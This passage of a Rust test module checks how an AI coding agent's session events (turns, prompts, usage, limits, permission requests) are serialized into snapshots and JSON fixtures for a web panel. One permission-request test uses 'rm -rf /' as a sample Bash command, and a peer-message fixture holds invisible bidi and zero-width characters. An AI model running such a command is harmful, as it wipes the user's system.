                        AgentDomainEvent::ResumeOutcome {
                            requested_provider_session_id: "prov-0".into(),
                            status: agent::ResumeStatus::Rejected,
                            attached_provider_session_id: None,
                            forked: false,
                            detail: None,
                        },
                    ],
                ),
            ),
            (
                "withdrawn_after_an_undelivered_prompt",
                with(
                    &finished,
                    vec![prompt("and the docs"), AgentDomainEvent::UserPromptWithdrawn],
                ),
            ),
            (
                "withdrawn_after_a_delivered_one",
                vec![
                    opened.clone(),
                    started("t1"),
                    AgentDomainEvent::UserMessageDelivered {
                        client_message_id: "eitri-1-1".into(),
                        turn_id: "t1".into(),
                        text: "and the docs".into(),
                    },
                    AgentDomainEvent::UserPromptWithdrawn,
                ],
            ),
            (
                "withdrawn_with_none",
                vec![opened.clone(), AgentDomainEvent::UserPromptWithdrawn],
            ),
        ];

        let mut written_cases = Vec::new();
        for (name, events) in cases {
            let mut projection = AgentSessionProjection::default();
            let mut delivered = Vec::new();
            for event in events {
                let derived = projection.apply_with_derived(&event);
                delivered.push(event);
                delivered.extend(derived);
            }
            let kinds: Vec<_> = projection.notices.iter().map(|n| n.kind).collect();
            match name {
                "foreign_while_running_with_text" => {
                    assert_eq!(projection.active_turn_id.as_deref(), Some("t1"), "{name}");
                    assert_eq!(kinds, [SessionNoticeKind::UnseenTurn], "{name}");
                    assert_eq!(projection.transcript.len(), 3, "{name}: the answer stands apart");
                }
                "foreign_while_running_without_text" => {
                    assert_eq!(projection.active_turn_id.as_deref(), Some("t1"), "{name}");
                    assert!(kinds.is_empty() && projection.turn_endings.is_empty(), "{name}");
                }
                "foreign_none_running_with_text" => {
                    assert_eq!(kinds, [SessionNoticeKind::UnseenTurn], "{name}");
                    assert!(projection.turn_endings.is_empty(), "{name}: no failed row");
                }
                "foreign_none_running_without_text" => {
                    assert!(kinds.is_empty() && projection.turn_endings.is_empty(), "{name}");
                }
                "own_turn_failed_with_text" => {
                    assert!(kinds.is_empty(), "{name}");
                    assert_eq!(projection.turn_endings.len(), 1, "{name}");
                }
                "hook_blocked_prompt" => assert_eq!(kinds, [SessionNoticeKind::HookBlock], "{name}"),
                "cli_work_unseen" => assert!(projection.cli_unseen_busy, "{name}"),
                "cli_work_unseen_then_its_end"
                | "cli_work_unseen_then_the_session_closes"
                | "cli_work_unseen_then_the_session_is_lost"
                | "cli_work_unseen_then_a_resume_that_did_not_attach" => {
                    assert!(!projection.cli_unseen_busy, "{name}")
                }
                "withdrawn_after_an_undelivered_prompt" => assert_eq!(projection.user_prompts.len(), 1, "{name}"),
                "withdrawn_after_a_delivered_one" => assert_eq!(projection.user_prompts.len(), 1, "{name}"),
                _ => assert!(kinds.is_empty(), "{name}"),
            }
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: Some("sess-1"),
                provider_session_id: Some("prov-1".into()),
                capabilities: agent::ProviderCapabilities {
                    interrupt: true,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &delivered);
            written_cases.push(json!({
                "name": name,
                "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
                "snapshot": serde_json::from_str::<Value>(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap(),
            }));
        }
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_unseen_turns_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "cases": written_cases,
        });
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/unseen-turns.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the unseen turns fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed unseen turns fixture is not what this test produces; if the change is \
                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    /// `agent-ui/web/src/fixtures/cli-turns.json`: turns Claude Code started by itself, with each kind of
    /// cause and a cause the close refined; a prompt Claude Code read only after work of its own, delivered
    /// and dropped; endings without a result, empty and not. Each case is the events this side delivers
    /// (derived ones included), a snapshot taken partway (`split` events in) and the snapshot after them
    /// all. The panel's tests fold the events, from the start and from the middle snapshot, and load the
    /// last snapshot, and must find the same page each way. Compared on every run;
    /// `EITRI_WRITE_FIXTURES=1` rewrites it.
    #[test]
    fn the_cli_turns_fixture_is_what_the_serializer_sends() {
        use agent::{ContentKind, TurnCause, TurnCauseKind, TurnEndDetail, TurnOrigin, TurnOutcome};
        let opened = AgentDomainEvent::SessionOpened {
            session_id: "sess-1".into(),
            provider_session_id: "prov-1".into(),
            model: "claude-sonnet-5".into(),
            cwd: "/project".into(),
        };
        let prompt = |text: &str| AgentDomainEvent::UserPromptSubmitted { text: text.into() };
        let started = |turn: &str| AgentDomainEvent::TurnStarted { turn_id: turn.into() };
        let cli = |turn: &str, cause: Option<TurnCause>| AgentDomainEvent::TurnAttributed {
            turn_id: turn.into(),
            origin: TurnOrigin::Cli,
            cause,
        };
        let text = |turn: &str, text: &str| AgentDomainEvent::ContentDelta {
            turn_id: turn.into(),
            kind: ContentKind::Text,
            text: text.into(),
        };
        let ended = |turn: &str, outcome: TurnOutcome, reason: Option<&str>| AgentDomainEvent::TurnCompleted {
            turn_id: turn.into(),
            outcome,
            result_text: String::new(),
            stop_reason: None,
            usage: None,
            detail: TurnEndDetail {
                reason: reason.map(str::to_string),
                origin_kind: Some("task-notification".into()),
                num_turns: Some(1),
                ..Default::default()
            },
        };
        let done = |turn: &str| ended(turn, TurnOutcome::Completed, None);
        let task = || {
            let mut cause = TurnCause::of_kind(TurnCauseKind::Task);
            cause.task_id = Some("bzng1ikb4".into());
            cause.task_kind = Some("shell".into());
            cause.task_status = Some("completed".into());
            cause.description = Some("cargo test".into());
            cause.summary = Some("Background command \"cargo test\" completed (exit code 0)".into());
            cause
        };
        let scheduled = |reason: Option<&str>| {
            let mut cause = TurnCause::of_kind(TurnCauseKind::Scheduled);
            cause.wakeup_source = Some("loop_wakeup".into());
            cause.scheduled_for_ms = Some(1_790_000_000_000);
            cause.schedule_reason = reason.map(str::to_string);
            cause
        };
        let peer = || {
            let mut cause = TurnCause::of_kind(TurnCauseKind::Peer);
            cause.peer_name = Some("reviewer".into());
            cause.text = Some("Please look at \u{202e}line 4\u{200b}".into());
            cause
        };
        let cli_turn = |turn: &str, cause: TurnCause, reply: &str| {
            vec![started(turn), cli(turn, Some(cause)), text(turn, reply), done(turn)]
        };
        let with = |base: Vec<AgentDomainEvent>, more: Vec<AgentDomainEvent>| {
            let mut events = base;
            events.extend(more);
            events
        };
        // The user's own turn, finished, before each case.
        let before = vec![
            opened.clone(),
            prompt("fix the parser"),
            started("t1"),
            text("t1", "Fixed."),
            done("t1"),
        ];
        let base = before.len();
        let delivered_prompt = AgentDomainEvent::UserMessageDelivered {
            client_message_id: "eitri-1-2".into(),
            turn_id: "t2".into(),
            text: "and the docs".into(),
        };
        let cycle = AgentDomainEvent::CliCycleStarted {
            turn_id: "t2".into(),
            cause: Some(task()),
        };
        // (name, events, split: how many events the middle snapshot has folded)
        let cases: Vec<(&str, Vec<AgentDomainEvent>, usize)> = vec![
            (
                "task_cause",
                with(before.clone(), cli_turn("c1", task(), "The tests passed.")),
                base + 2,
            ),
            (
                "unknown_cause_updated_at_the_close",
                with(
                    before.clone(),
                    vec![
                        started("c1"),
                        cli("c1", Some(TurnCause::of_kind(TurnCauseKind::Unknown))),
                        text("c1", "Done."),
                        AgentDomainEvent::TurnCauseUpdated {
                            turn_id: "c1".into(),
                            cause: Some(task()),
                        },
                        // No news: the cause stays.
                        AgentDomainEvent::TurnCauseUpdated {
                            turn_id: "c1".into(),
                            cause: None,
                        },
                        done("c1"),
                    ],
                ),
                base + 3,
            ),
            (
                "scheduled_with_a_reason",
                with(
                    before.clone(),
                    cli_turn("c1", scheduled(Some("check the deploy")), "Green."),
                ),
                base + 2,
            ),
            (
                "scheduled_without_a_reason",
                with(before.clone(), cli_turn("c1", scheduled(None), "Green.")),
                base + 2,
            ),
            (
                "three_empty_scheduled_turns",
                with(
                    before.clone(),
                    ["c1", "c2", "c3"]
                        .into_iter()
                        .flat_map(|turn| vec![started(turn), cli(turn, Some(scheduled(None))), done(turn)])
                        .collect(),
                ),
                base + 4,
            ),
            (
                "peer_with_its_body",
                with(before.clone(), cli_turn("c1", peer(), "Looked.")),
                base + 2,
            ),
            (
                "prompt_read_after_work_of_its_own",
                with(
                    before.clone(),
                    vec![
                        prompt("and the docs"),
                        started("t2"),
                        cycle.clone(),
                        text("t2", "The build finished."),
                        delivered_prompt.clone(),
                        text("t2", "Docs updated."),
                        done("t2"),
                    ],
                ),
                base + 2,
            ),
            (
                "prompt_dropped_after_work_of_its_own",
                with(
                    before.clone(),
                    vec![
                        prompt("and the docs"),
                        started("t2"),
                        cycle.clone(),
                        text("t2", "The build finished."),
                        AgentDomainEvent::UserMessageDropped {
                            client_message_id: "eitri-1-2".into(),
                            reason: "Claude Code cancelled it".into(),
                        },
                        done("t2"),
                    ],
                ),
                base + 3,
            ),
            (
                "a_cli_turn_ending_off_screen",
                with(before.clone(), cli_turn("c1", task(), "The tests passed.")),
                base + 3,
            ),
            (
                "no_result_after_a_reply",
                with(
                    before.clone(),
                    vec![
                        started("c1"),
                        cli("c1", Some(task())),
                        text("c1", "Looking"),
                        ended("c1", TurnOutcome::Failed, Some(agent::NO_RESULT_REASON)),
                    ],
                ),
                base + 3,
            ),
            (
                "empty_no_result",
                with(
                    before.clone(),
                    vec![
                        started("c1"),
                        cli("c1", Some(task())),
                        ended("c1", TurnOutcome::Failed, Some(agent::NO_RESULT_REASON)),
                    ],
                ),
                base + 2,
            ),
        ];

        let view_of = |projection: &AgentSessionProjection| {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: Some("sess-1"),
                provider_session_id: Some("prov-1".into()),
                capabilities: agent::ProviderCapabilities {
                    interrupt: true,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            serde_json::from_str::<Value>(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap()
        };
        let mut written_cases = Vec::new();
        for (name, events, split) in cases {
            let mut projection = AgentSessionProjection::default();
            let mut attention = crate::attention::AttentionTracker::default();
            let mut delivered = Vec::new();
            let mut middle = Value::Null;
            let mut middle_at = 0;
            for (at, event) in events.into_iter().enumerate() {
                if at == split {
                    middle = view_of(&projection);
                    middle_at = delivered.len();
                }
                // The user's own turn before the case was read.
                if at == base {
                    attention.seen();
                }
                let derived = projection.apply_with_derived(&event);
                let mut batch = vec![event];
                batch.extend(derived);
                // Off screen throughout, so every end that is news marks the tab.
                attention.observe(&batch, false);
                delivered.extend(batch);
            }
            let prompts: Vec<_> = projection.user_prompts.iter().map(|p| p.text.as_str()).collect();
            let starts: Vec<_> = projection
                .turn_starts
                .iter()
                .map(|s| (s.turn_id.as_str(), s.cause.as_ref().map(|c| c.kind)))
                .collect();
            assert_eq!(projection.active_turn_id, None, "{name}: every case ends its turns");
            match name {
                "task_cause" | "a_cli_turn_ending_off_screen" | "peer_with_its_body" => {
                    assert_eq!(starts.len(), 1, "{name}");
                    assert!(attention.attention().unread, "{name}: its end off screen is news");
                }
                "unknown_cause_updated_at_the_close" => {
                    assert_eq!(
                        starts,
                        [("c1", Some(TurnCauseKind::Task))],
                        "{name}: the close's cause wins"
                    )
                }
                "three_empty_scheduled_turns" => {
                    assert_eq!(starts.len(), 3, "{name}: an empty turn that completed keeps its row");
                    assert!(projection.turn_endings.is_empty(), "{name}");
                }
                "prompt_read_after_work_of_its_own" => {
                    assert_eq!(prompts, ["fix the parser", "and the docs"], "{name}");
                    assert_eq!(starts, [("t2", Some(TurnCauseKind::Task))], "{name}");
                    let moved = projection.user_prompts.last().unwrap();
                    let woken = projection
                        .transcript
                        .iter()
                        .find(|m| m.text == "The build finished.")
                        .unwrap();
                    assert!(
                        moved.delivered && moved.seq > woken.seq,
                        "{name}: read after the woken work"
                    );
                }
                "prompt_dropped_after_work_of_its_own" => {
                    assert_eq!(
                        prompts,
                        ["fix the parser"],
                        "{name}: the tab holds it, not the conversation"
                    );
                    assert_eq!(
                        projection.steer_outcome("eitri-1-2"),
                        Some(&agent::SteerOutcome::Dropped {
                            reason: "Claude Code cancelled it".into()
                        }),
                        "{name}"
                    );
                }
                "no_result_after_a_reply" => {
                    assert_eq!(starts.len(), 1, "{name}");
                    assert_eq!(projection.turn_endings.len(), 1, "{name}");
                    assert_eq!(
                        projection.turn_endings[0].detail.reason.as_deref(),
                        Some(agent::NO_RESULT_REASON),
                        "{name}"
                    );
                    assert_eq!(projection.turn_endings[0].detail.num_turns, Some(1), "{name}");
                    assert!(attention.attention().unread, "{name}");
                }
                "empty_no_result" => {
                    assert!(starts.is_empty(), "{name}: no row says why it started");
                    assert!(projection.turn_endings.is_empty(), "{name}: no ending row");
                    assert_eq!(projection.last_turn_ending, None, "{name}");
                    assert!(!attention.attention().unread, "{name}: nothing to read");
                }
                _ => assert_eq!(starts.len(), 1, "{name}"),
            }
            let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &delivered);
            written_cases.push(json!({
                "name": name,
                "split": middle_at,
                "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
                "middle": middle,
                "snapshot": view_of(&projection),
            }));
        }
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_cli_turns_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "cases": written_cases,
        });
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/cli-turns.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the CLI turns fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed CLI turns fixture is not what this test produces; if the change is \
                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    /// A snapshot taken mid-turn names the prompt that turn opened with and whether Claude Code started
    /// it; once the turn ends it names neither.
    #[test]
    fn the_running_turns_opening_prompt_and_origin_ride_the_snapshot_only_while_set() {
        let snapshot = |projection: &AgentSessionProjection| {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities::default(),
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            serde_json::from_str::<Value>(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap()["state"].clone()
        };
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::UserPromptSubmitted { text: "go".into() });
        projection.apply(&AgentDomainEvent::TurnStarted { turn_id: "t1".into() });
        let state = snapshot(&projection);
        assert_eq!(state["openingPromptSeq"], json!(0));
        assert!(state.get("runningTurnCli").is_none());
        projection.apply(&AgentDomainEvent::TurnCompleted {
            turn_id: "t1".into(),
            outcome: agent::TurnOutcome::Completed,
            result_text: String::new(),
            stop_reason: None,
            usage: None,
            detail: Default::default(),
        });
        projection.apply(&AgentDomainEvent::TurnStarted { turn_id: "c1".into() });
        projection.apply(&AgentDomainEvent::TurnAttributed {
            turn_id: "c1".into(),
            origin: agent::TurnOrigin::Cli,
            cause: None,
        });
        let state = snapshot(&projection);
        assert!(state.get("openingPromptSeq").is_none());
        assert_eq!(state["runningTurnCli"], json!(true));
    }

    /// A change held for a call that has not started rides the snapshot, so a page rebuilt from it
    /// attaches the mark when the call starts, as Rust does; with nothing held the key is absent.
    #[test]
    fn a_change_held_for_its_call_rides_the_snapshot_and_nothing_held_sends_no_key() {
        let mut projection = AgentSessionProjection::default();
        let view = |projection: &AgentSessionProjection| {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities::default(),
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            serde_json::from_str::<Value>(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap()
        };
        assert!(view(&projection)["state"].get("changedInputsBeforeTheirCall").is_none());
        projection.apply(&AgentDomainEvent::ToolInputChanged {
            tool_use_id: "toolu_9".into(),
            change: agent::InputChange {
                fields: json!({ "command": "b" }).as_object().unwrap().clone(),
                removed: vec![],
                clipped: false,
            },
        });
        let held = &view(&projection)["state"]["changedInputsBeforeTheirCall"];
        assert_eq!(held[0]["toolUseId"], "toolu_9");
        assert_eq!(held[0]["change"]["fields"]["command"], "b");
    }

    /// A tab's last usage figure rides its snapshot so a tab switch or panel reload shows it
    /// immediately. It is a present `null` key until a provider reports usage, then replaced whole
    /// by each report. Its snake_case fields match `turn_completed` and `agent::UsageInfo`, even
    /// though the surrounding state uses camelCase.
    #[test]
    fn a_snapshot_carries_the_last_reported_usage_and_null_before_any() {
        let usage_in_snapshot = |projection: &AgentSessionProjection| -> Value {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities {
                    resume: false,
                    fork: false,
                    interrupt: true,
                    bypass_permission_mode: true,
                    interactive_permission_mode: true,
                    cli_auto_mode: false,
                    steer: false,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            assert!(
                parsed["state"].as_object().unwrap().contains_key("usage"),
                "the key is always sent: `null` says nothing was reported, an absent key says this build predates it"
            );
            parsed["state"]["usage"].clone()
        };
        let completed = |usage: Option<agent::UsageInfo>| AgentDomainEvent::TurnCompleted {
            turn_id: "t1".into(),
            outcome: agent::TurnOutcome::Completed,
            result_text: String::new(),
            stop_reason: None,
            usage,
            detail: Default::default(),
        };

        let mut projection = AgentSessionProjection::default();
        assert_eq!(
            usage_in_snapshot(&projection),
            Value::Null,
            "a fresh session has reported nothing"
        );

        // A turn that reports nothing (interrupted, synthesized) is unknown, not a zero.
        projection.apply(&completed(None));
        assert_eq!(
            usage_in_snapshot(&projection),
            Value::Null,
            "silence is not a measurement"
        );

        // The sidecar's shape: tokens and a model, no turn count.
        projection.apply(&completed(Some(agent::UsageInfo {
            cost_reported: true,
            total_cost_usd: 0.42,
            num_turns: None,
            tokens: Some(agent::TokenUsage {
                input: 1,
                output: 2,
                cache_creation: 3,
                cache_read: 4,
            }),
            model: Some("claude-sonnet-5".into()),
        })));
        assert_eq!(
            usage_in_snapshot(&projection),
            json!({
                "total_cost_usd": 0.42,
                "num_turns": null,
                "tokens": {"input": 1, "output": 2, "cache_creation": 3, "cache_read": 4},
                "model": "claude-sonnet-5",
            })
        );

        // A later turn that reports nothing leaves the last figure standing...
        projection.apply(&completed(None));
        assert_eq!(usage_in_snapshot(&projection)["total_cost_usd"], 0.42);

        // ...and one that does replaces it whole, a lower figure included (`/clear` resets the SDK's
        // running total). Legacy's shape: a turn count, no tokens and no model.
        projection.apply(&completed(Some(agent::UsageInfo {
            cost_reported: true,
            total_cost_usd: 0.01,
            num_turns: Some(3),
            tokens: None,
            model: None,
        })));
        assert_eq!(
            usage_in_snapshot(&projection),
            json!({"total_cost_usd": 0.01, "num_turns": 3, "tokens": null, "model": null})
        );
    }

    /// The account's usage limit rides the snapshot like the usage figure does, so a tab switch or a
    /// panel reload shows it without waiting for the agent's next report. An explicit `null` until one
    /// arrived; camelCase inside, unlike `usage`, because the panel folds it from a hand-shaped object.
    /// How many commands the agent left running rides the snapshot, so a tab switch or a reload shows
    /// the band's count; `0` when there are none.
    #[test]
    fn the_background_count_reaches_the_ui_snapshot() {
        let count_in_snapshot = |projection: &AgentSessionProjection| -> Value {
            let view = SnapshotView {
                backend: "external",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities {
                    resume: false,
                    fork: false,
                    interrupt: true,
                    bypass_permission_mode: true,
                    interactive_permission_mode: true,
                    cli_auto_mode: false,
                    steer: false,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            parsed["state"]["backgroundCalls"].clone()
        };
        let mut projection = AgentSessionProjection::default();
        assert_eq!(count_in_snapshot(&projection), json!(0));
        projection.apply(&AgentDomainEvent::BackgroundCalls { running: 2 });
        assert_eq!(count_in_snapshot(&projection), json!(2));
        projection.apply(&AgentDomainEvent::BackgroundCalls { running: 0 });
        assert_eq!(count_in_snapshot(&projection), json!(0));
    }

    #[test]
    fn account_limits_reach_the_ui_snapshot() {
        let limits_in_snapshot = |projection: &AgentSessionProjection| -> Value {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities {
                    resume: false,
                    fork: false,
                    interrupt: true,
                    bypass_permission_mode: true,
                    interactive_permission_mode: true,
                    cli_auto_mode: false,
                    steer: false,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            assert!(
                parsed["state"].as_object().unwrap().contains_key("accountLimits"),
                "the key is always sent: `null` says no report yet"
            );
            parsed["state"]["accountLimits"].clone()
        };
        let mut projection = AgentSessionProjection::default();
        assert_eq!(limits_in_snapshot(&projection), Value::Null);

        projection.apply(&AgentDomainEvent::AccountLimits {
            used_percent: 42.5,
            window_minutes: Some(300),
            resets_at: Some(1_790_000_000),
            plan: Some("pro".into()),
        });
        assert_eq!(
            limits_in_snapshot(&projection),
            json!({"usedPercent": 42.5, "windowMinutes": 300, "resetsAt": 1_790_000_000i64, "plan": "pro"})
        );

        // The latest report replaces the whole figure; fields the agent left out are `null`, not kept.
        projection.apply(&AgentDomainEvent::AccountLimits {
            used_percent: 61.0,
            window_minutes: None,
            resets_at: None,
            plan: None,
        });
        assert_eq!(
            limits_in_snapshot(&projection),
            json!({"usedPercent": 61.0, "windowMinutes": null, "resetsAt": null, "plan": null})
        );
    }

    #[test]
    fn available_commands_reach_the_ui_snapshot() {
        let commands_in_snapshot = |projection: &AgentSessionProjection| -> Value {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities {
                    resume: false,
                    fork: false,
                    interrupt: true,
                    bypass_permission_mode: true,
                    interactive_permission_mode: true,
                    cli_auto_mode: false,
                    steer: false,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            assert!(
                parsed["state"].as_object().unwrap().contains_key("availableCommands"),
                "the key is always sent: `null` says the agent listed none"
            );
            parsed["state"]["availableCommands"].clone()
        };
        let mut projection = AgentSessionProjection::default();
        assert_eq!(commands_in_snapshot(&projection), Value::Null);

        projection.apply(&AgentDomainEvent::CommandsAvailable {
            commands: vec![
                agent::SlashCommand {
                    name: "web".into(),
                    description: "Search the web".into(),
                    hint: Some("query".into()),
                },
                agent::SlashCommand {
                    name: "test".into(),
                    description: String::new(),
                    hint: None,
                },
            ],
        });
        assert_eq!(
            commands_in_snapshot(&projection),
            json!([
                {"name": "web", "description": "Search the web", "hint": "query"},
                {"name": "test", "description": ""},
            ])
        );

        // The latest list replaces the whole earlier one, and an empty one withdraws them.
        projection.apply(&AgentDomainEvent::CommandsAvailable { commands: vec![] });
        assert_eq!(commands_in_snapshot(&projection), json!([]));
    }

    /// sw-panel-render-2 (2026-09-27): a snapshot taken mid-reply used to say nothing at all about
    /// whether the last transcript entry was still open -- `applySnapshot` forced its own copy of
    /// the bit to `false` regardless, splitting a streaming reply into two rows on every snapshot
    /// landing mid-stream. This projection's own bit (`assistant_message_open`) is genuinely `true`
    /// here (a `ContentDelta` with no tool call or turn boundary after it), and the wire must say so.
    #[test]
    fn a_snapshot_mid_reply_carries_the_open_message_bit() {
        let capabilities = agent::ProviderCapabilities {
            resume: false,
            fork: false,
            interrupt: true,
            bypass_permission_mode: true,
            interactive_permission_mode: true,
            cli_auto_mode: false,
            steer: false,
            ..Default::default()
        };
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::SessionOpened {
            session_id: "verdandi-1".into(),
            provider_session_id: "claude-1".into(),
            model: "claude-sonnet-5".into(),
            cwd: "/tmp".into(),
        });
        projection.apply(&AgentDomainEvent::TurnStarted { turn_id: "t1".into() });
        projection.apply(&AgentDomainEvent::ContentDelta {
            turn_id: "t1".into(),
            kind: agent::ContentKind::Text,
            text: "Use **strong".into(),
        });
        assert!(
            projection.assistant_message_open,
            "the projection's own bit must be true here"
        );
        {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities,
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            assert_eq!(parsed["state"]["assistantMessageOpen"], true);
        }

        // And the other direction: a tool call closes it, on both sides, and the wire says so too.
        projection.apply(&AgentDomainEvent::ToolCallStarted {
            turn_id: "t1".into(),
            tool_use_id: "toolu_1".into(),
            name: "Bash".into(),
            input: json!({}),
        });
        assert!(!projection.assistant_message_open);
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities,
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        assert_eq!(parsed["state"]["assistantMessageOpen"], false);
    }

    /// The link from a permission card back to the tool call it gates.
    ///
    /// The EVENT path has always carried it (`AgentDomainEvent`'s own derived `Serialize` emits
    /// every field of `PermissionRequested`); this serializer dropped it, so a panel that
    /// rehydrated from a snapshot -- a reload, or a bounded-queue overflow -- lost a link the live
    /// path had. With several calls of one tool in flight, "Bash wants to run" identifies nothing.
    #[test]
    fn a_pending_permission_snapshot_carries_the_tool_call_it_gates() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::PermissionRequested {
            permission_id: "perm-1".into(),
            tool_use_id: Some("toolu_01ABC".into()),
            tool_name: "Bash".into(),
            input: json!({"command": "rm -rf /"}),
            provider_prompt: None,
        });
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let pending = &parsed["state"]["pendingPermissions"][0];
        assert_eq!(pending["permissionId"], "perm-1");
        assert_eq!(pending["toolUseId"], "toolu_01ABC");
        assert_eq!(pending["toolName"], "Bash");
    }

    /// The CLI's own prompt for a call is a card of its own for the SAME call: its snapshot entry and its
    /// event both carry the call's id next to the provider's words, so the panel can hang it under the
    /// call and `a`/`d` on that call's row reach it. Without the id the card would be drawn by
    /// sequence only and no key on the tool row could answer it.
    #[test]
    fn a_provider_prompt_keeps_the_tool_call_it_names_in_snapshot_and_event() {
        let event = AgentDomainEvent::PermissionRequested {
            permission_id: "perm-cli".into(),
            tool_use_id: Some("toolu_01ABC".into()),
            tool_name: "Bash".into(),
            input: json!({"command": "echo hi"}),
            provider_prompt: Some(agent::ProviderPrompt {
                reason: None,
                description: Some("Print hi".into()),
                blocked_path: None,
                matched_ask_rule: Some(agent::MatchedAskRule {
                    source: "projectSettings".into(),
                    tool_name: "Bash".into(),
                    rule_content: Some("echo:*".into()),
                }),
                unrecognized_origin: None,
            }),
        };
        let on_the_wire = serde_json::to_value(&event).unwrap();
        assert_eq!(on_the_wire["tool_use_id"], "toolu_01ABC");
        assert!(on_the_wire["provider_prompt"].is_object());

        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::ToolCallStarted {
            turn_id: "t1".into(),
            tool_use_id: "toolu_01ABC".into(),
            name: "Bash".into(),
            input: json!({"command": "echo hi"}),
        });
        projection.apply(&event);
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: true,
                steer: false,
                ..Default::default()
            },
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
